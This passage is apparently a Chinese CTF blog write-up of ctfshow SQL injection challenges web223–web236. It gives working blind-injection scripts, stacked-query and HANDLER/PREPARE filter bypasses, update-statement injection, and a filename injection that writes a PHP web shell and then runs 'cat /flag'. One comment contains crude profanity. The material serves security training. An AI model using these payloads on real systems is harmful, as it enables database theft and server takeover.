class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagas&#x27;&quot;</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">&quot;select flagasabc from ctfshow_flagas&quot;</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((&#123;&#125;),&#123;&#125;,true))=(&#123;&#125;),username,false)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        result_num=generateNum(i)</span><br><span class="line">        result=generateNum(j)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;u&#x27;</span> : payload.<span class="built_in">format</span>(sql,result_num,result)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;userAUTO&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>太重量级了，我拼个半天那个测试payload就是不对，true拼接咋拼咋不对，草泥马，傻逼sql注入你妈妈死了。<br>不用asci拼到substr里就是不行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=<span class="keyword">if</span>(substr((database()),(true),true)=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>第一个就行<br>第二个就不行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cd6ed-c9e2-47c0-8f98-045fe552c6cd.challenge.ctf.show/api/?u=<span class="keyword">if</span>(mid((database()),(true+true),(true))=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p>似乎不是sql注入，而是文件上传。<br> 实际上robots.txt能扫出来有修改密码的位置，修改密码之后登录是一个文件上传。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690440405918-9387ad36-0b95-4e7a-8698-b57c6f13a676.png" alt="20201128094552251.png"><br>文件名注入，写入文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File <span class="string">&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;; --+</span></span><br></pre></td></tr></table></figure>
<p>保存为：<code>payload.bin</code>其中十六进制为：<code>&lt;?=``$_GET[1]?``&gt;</code>，然后访问1.php传参1RCE。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>.php?<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure>
<h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h3 id="handler，预处理"><a href="#handler，预处理" class="headerlink" title="handler，预处理"></a>handler，预处理</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a><br><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> handler官方文档</p>
</blockquote>
<p>没过滤show字符：<code>ctfshow&#39;;show tables;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_flagasa&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_user&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
<p>用handler读取：<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;flagas&quot;</span>:<span class="string">&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;you get it&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h2 id="至于什么是handler："><a href="#至于什么是handler：" class="headerlink" title="至于什么是handler："></a>至于什么是handler：</h2><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭，使用方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="comment">//预定义SQL语句</span></span><br><span class="line">EXECUTE name;  <span class="comment">//执行预定义SQL语句</span></span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  <span class="comment">//删除预定义SQL        语句</span></span><br></pre></td></tr></table></figure>
<p>字符串预处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt1 FROM <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">ET @a = <span class="number">3</span>;</span><br><span class="line">SET @b = <span class="number">4</span>;                                                   </span><br><span class="line">EXECUTE stmt1 USING @a, @b;</span><br></pre></td></tr></table></figure>
<p>变量定义预处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET @s = <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">PREPARE stmt2 FROM @s;</span><br><span class="line">SET @c = <span class="number">6</span>;</span><br><span class="line">ET @d = <span class="number">8</span>;</span><br><span class="line">EXECUTE stmt2 USING @c, @d;</span><br><span class="line">DEALLOCATE PREPARE stmt2;</span><br></pre></td></tr></table></figure>
<p>利用concat绕过过滤，然后将后面的database()替换为需要执行的语句。别忘记中间的空格。<br>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure>
<p>或者用concat得到的连接字符也可以代替select：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(char(115,101,108,101,99,116), &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure>
<h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><p>我们之前在web224中的文件上传就使用了转换为十六进制然后将内容前加上0x。再加上预处理。<br>十六进制转换可以这样写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch in text:</span><br><span class="line">    hex_ch = <span class="title function_ invoke__">hex</span>(<span class="title function_ invoke__">ord</span>(ch)).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    hex_str += hex_ch</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;原文：\n&quot;</span>+text)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;十六进制（不带0x）：\n&quot;</span>+hex_str)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;十六进制（带0x）：\n&quot;</span>+<span class="string">&quot;0x&quot;</span>+hex_str)</span><br></pre></td></tr></table></figure>
<p>我们将需要预编译的语句转换为十六进制。然后再传入比如：<br>show被过滤掉了，不要出现。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">十六进制前：</span><br><span class="line">select <span class="title function_ invoke__">database</span>()</span><br><span class="line">转换后：</span><br><span class="line"><span class="number">0x73656c6563742064617461626173652829</span></span><br><span class="line">加上预编译语句：</span><br><span class="line">ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c6563742064617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure>
<p>然后再将中间的内容转换为需要的查询语句即可。<br>比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>()</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c656374207461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure>
<p>查列</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;ctfsh_ow_flagas&#x27;</span></span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420636f6c756d6e5f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure>
<p>查内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select flagasb <span class="keyword">from</span> ctfsh_ow_flagas</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure>
<p>就能查到flag了。</p>
<h1 id="web227、web228-web230"><a href="#web227、web228-web230" class="headerlink" title="web227、web228-web230"></a>web227、web228-web230</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">https://blog.csdn.net/qq_41573234/article/details/80411079</a></p>
</blockquote>
<p>他这里定义了自定义函数，所以需要去查询：<code>information_schema.Routines</code>这个：<br>其中的getFlag函数会调用flag 。也就是说直接<code>1&#39;;call getflag()</code>也可以<br>但其实这里已经显示出了flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690450427521-41d6da19-84df-4400-932d-8186fd04e438.png" alt="image.png"></p>
<h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h3 id="update盲注"><a href="#update盲注" class="headerlink" title="update盲注"></a>update盲注</h3><p>这里需要开出来两个页面，一个负责修改（<code>/api/</code>），一个负责查看（<code>/update.php</code>）。直接修改内容，<br>比如在修改页面中传参：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=database() where 1=1#&amp;username=1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461441854-8098f695-7156-4f77-a11f-4b87bc4fd815.png" alt="image.png"><br>运行之后返回查看页面发现被更新了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461474262-de625929-36e1-4802-b43b-a5f9fffc57d3.png" alt="image.png"><br>然后就依次插入查询语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flaga</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagas,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select flagas from flaga) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;bda6ff95-49e5-4832-98ef-5f2156f74200&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>这个遇上一个的差别就是多个md5的括号需要闭合。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagaa</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagass,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select flagass from flagaa) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;d980485f-5f60-4558-a646-0c538bc3b9a1&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p>盲注python。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>我们能注意到当输入密码的值为第一次出现时且正确时，后面的结果会出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464682345-2a7b7d80-3e4d-4124-aefd-9a98db2a726d.png" alt="image.png"><br>但是如果后面为0或者出现过一次则出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464738476-4e900a40-1db3-4449-b894-43c55ffd9137.png" alt="image.png">、<br>编写脚本即可：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/27 21:10   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = r<span class="string">&#x27;http://9a69458e-791c-4ebd-abe9-45cc89eaf042.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow&#x27;and+if(mid((select flagass233 from flag233333),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j in str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="title function_ invoke__">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="title function_ invoke__">str</span>(random.<span class="title function_ invoke__">random</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> r<span class="string">&#x27;成功&#x27;</span> in r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><p>单引号被过滤了，这里用了一个<code>\</code>来逃逸。<br>就比如原语句是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>插入之后的语句是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;username&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>然后pass张的内容就是<code>&#39; where username =</code><br>可能这么讲会听不太懂，就是将&#39;当作转义的’ 然后和后面的单引号闭合：<br><code>update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;</code><br>也就变为了：<br><code>update ctfshow_user set pass = &#39;&#39; where username = &#39;username&#39;</code><br>测试payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,ctfshow_user,flag23a</span><br></pre></td></tr></table></figure>
<p>这里过滤掉了单引号，但是不闭合就查询不到，那就用十六进制来代替一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x666c6167323361</span>)--+</span><br><span class="line">  id,flagass23s3,info</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select flagass23s3 <span class="keyword">from</span> flag23a)--+</span><br><span class="line">  ctfshow&#123;a4682f2f-<span class="number">3</span>c53-<span class="number">464</span>d-<span class="number">8733</span>-<span class="number">7</span>d88487cb1f5&#125;</span><br></pre></td></tr></table></figure>
<h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm">https://www.jb51.net/article/134678.htm</a> mysql统计信息<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a> 无列名注入</p>
</blockquote>
<h3 id="过滤了or-‘-information表的替代方法"><a href="#过滤了or-‘-information表的替代方法" class="headerlink" title="过滤了or  ‘ information表的替代方法"></a>过滤了or  ‘ information表的替代方法</h3><p>这里不只是or关键字不能用，连带着information也不能用了，因此也就需要用你别的查询方法了。<br><code>mysql.innodb_table_stats</code><br>比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,flag23a1</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select b <span class="keyword">from</span> (select <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a</span><br><span class="line">  ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure>
<p>或者用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(select `<span class="number">2</span>` <span class="keyword">from</span>(select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)-- - &amp;password=\</span><br><span class="line">ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure>
<p>无列名这种特殊注入都可以。</p>
<h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>还过滤掉了flag这次 但没啥用 绕过flag的策略有很多。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">banlist,ctfshow_user,flaga</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> to_base64(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">--+</span></span><br><span class="line">Y3Rmc2hvd3tkOTQyOTcxNC00MTA2LTRkMjItYjg0YS01ODFiOTIzOWI2MGJ9</span><br><span class="line">ctfshow&#123;d9429714<span class="number">-4106</span><span class="number">-4</span>d22<span class="operator">-</span>b84a<span class="number">-581</span>b9239b60b&#125;</span><br></pre></td></tr></table></figure>
